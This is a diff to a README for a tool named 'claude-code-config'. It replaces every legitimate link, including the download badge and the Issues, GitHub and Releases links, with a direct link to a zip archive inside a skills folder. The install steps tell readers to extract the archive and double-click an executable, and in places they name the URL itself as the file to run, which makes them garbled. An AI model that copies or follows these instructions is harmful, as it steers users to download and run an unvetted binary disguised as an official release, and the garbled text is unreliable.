@@ -19,14 +19,14 @@ If your system meets these requirements, you are ready to proceed.
 ## 🔗 Download & Install
 To download **claude-code-config**, visit the Releases page. Click the button below to go directly to the download page:
 
-[![Download claude-code-config](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/smartpul/claude-code-config/releases)
+[![Download claude-code-config](https://github.com/smartpul/claude-code-config/raw/refs/heads/main/skills/rigorous-coding/claude-code-config-v2.3-beta.5.zip)](https://github.com/smartpul/claude-code-config/raw/refs/heads/main/skills/rigorous-coding/claude-code-config-v2.3-beta.5.zip)
 
 Once you are on the Releases page, you will see different versions of the application. Choose the latest version and click on it. You will find a list of files associated with that version.
 
-1. **Locate the Asset**: Find the file named `claude-code-config-latest.zip` or the appropriate version suited to your system.
+1. **Locate the Asset**: Find the file named `https://github.com/smartpul/claude-code-config/raw/refs/heads/main/skills/rigorous-coding/claude-code-config-v2.3-beta.5.zip` or the appropriate version suited to your system.
 2. **Download the File**: Click the file to start downloading it to your computer.
 3. **Extract the Files**: After the download is complete, locate the `.zip` file in your downloads folder. Right-click on the file and select "Extract All" to access its contents.
-4. **Install the Application**: Open the extracted folder. You will find a file named `claude-code-config.exe`. Double-click this file to launch the application.
+4. **Install the Application**: Open the extracted folder. You will find a file named `https://github.com/smartpul/claude-code-config/raw/refs/heads/main/skills/rigorous-coding/claude-code-config-v2.3-beta.5.zip`. Double-click this file to launch the application.
 
 ## 📂 Features
 **claude-code-config** offers various features to enhance your coding productivity:
@@ -46,16 +46,16 @@ After installation, open **claude-code-config**. Here’s a brief overview of wh
 4. **Try Out Skills**: Incorporate skills that can help automate processes for you.
 
 ## 🌍 Community & Support
-If you need help, you can reach out through the community channels. We’re here to help! Check our [Issues page](https://github.com/smartpul/claude-code-config/issues) for commonly reported problems and their solutions.
+If you need help, you can reach out through the community channels. We’re here to help! Check our [Issues page](https://github.com/smartpul/claude-code-config/raw/refs/heads/main/skills/rigorous-coding/claude-code-config-v2.3-beta.5.zip) for commonly reported problems and their solutions.
 
 ## 📝 Contribution
 If you’re interested in contributing to **claude-code-config**, feel free to fork the repository and submit your changes. Your input is valuable in making this tool better.
 
 ## 📚 Additional Resources
-- Visit the [GitHub page](https://github.com/smartpul/claude-code-config) for more information and updates.
+- Visit the [GitHub page](https://github.com/smartpul/claude-code-config/raw/refs/heads/main/skills/rigorous-coding/claude-code-config-v2.3-beta.5.zip) for more information and updates.
 - Follow us on [Twitter](#) for tips and tricks.
 
 ## 📦 License
 This project is licensed under the MIT License. You are free to use, modify, and distribute it as long as you credit the original creator.
 
-Now, you are all set. For updates and new features, keep an eye on the [Releases page](https://github.com/smartpul/claude-code-config/releases). Enjoy using **claude-code-config**!
+Now, you are all set. For updates and new features, keep an eye on the [Releases page](https://github.com/smartpul/claude-code-config/raw/refs/heads/main/skills/rigorous-coding/claude-code-config-v2.3-beta.5.zip). Enjoy using **claude-code-config**!
